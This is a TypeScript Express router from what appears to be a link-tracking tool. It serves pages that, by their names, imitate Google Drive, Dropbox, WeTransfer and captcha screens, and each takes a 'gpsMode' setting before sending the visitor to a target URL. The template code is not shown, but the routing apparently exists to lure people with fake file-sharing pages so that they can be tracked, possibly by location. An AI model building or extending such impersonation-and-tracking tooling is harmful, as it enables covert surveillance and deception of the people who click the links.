import { Router } from 'express';
import * as linkService from '../services/link.service.js';
import { renderRedirectTemplate } from '../tracking-templates/redirect.js';
import { renderGoogleDriveTemplate } from '../tracking-templates/google-drive.js';
import { renderDropboxTemplate } from '../tracking-templates/dropbox.js';
import { renderCaptchaTemplate } from '../tracking-templates/captcha.js';
import { renderWeTransferTemplate } from '../tracking-templates/we-transfer.js';
import { renderNotFoundTemplate } from '../tracking-templates/not-found.js';
import { renderExpiredTemplate } from '../tracking-templates/expired.js';
import { asyncHandler } from '../utils/asyncHandler.js';

const router = Router();

router.get('/:templateId/:slug', asyncHandler(async (req, res) => {
  const templateId = req.params.templateId as string;
  const slug = req.params.slug as string;
  const link = await linkService.getLinkBySlug(slug);

  if (!link || !link.isActive) {
    res.status(404).type('html').send(renderNotFoundTemplate());
    return;
  }

  if (link.templateId !== templateId) {
    res.status(404).type('html').send(renderNotFoundTemplate());
    return;
  }

  // Check expiration
  if (linkService.isLinkExpired(link)) {
    res.status(410).type('html').send(renderExpiredTemplate());
    return;
  }

  let options: Record<string, unknown> = {};
  if (link.templateOptions) {
    try {
      options = JSON.parse(link.templateOptions);
    } catch {
      options = {};
    }
  }
  const gpsMode = link.gpsMode || 'optional';

  let html: string;
  switch (templateId) {
    case 'redirect':
      html = renderRedirectTemplate(slug, link.targetUrl, options, gpsMode);
      break;
    case 'gdrive':
      html = renderGoogleDriveTemplate(slug, link.targetUrl, options, gpsMode);
      break;
    case 'dropbox':
      html = renderDropboxTemplate(slug, link.targetUrl, options, gpsMode);
      break;
    case 'captcha':
      html = renderCaptchaTemplate(slug, link.targetUrl, options, gpsMode);
      break;
    case 'wetransfer':
      html = renderWeTransferTemplate(slug, link.targetUrl, options, gpsMode);
      break;
    default:
      res.status(404).type('html').send(renderNotFoundTemplate());
      return;
  }

  res.type('html').send(html);
}));

export default router;
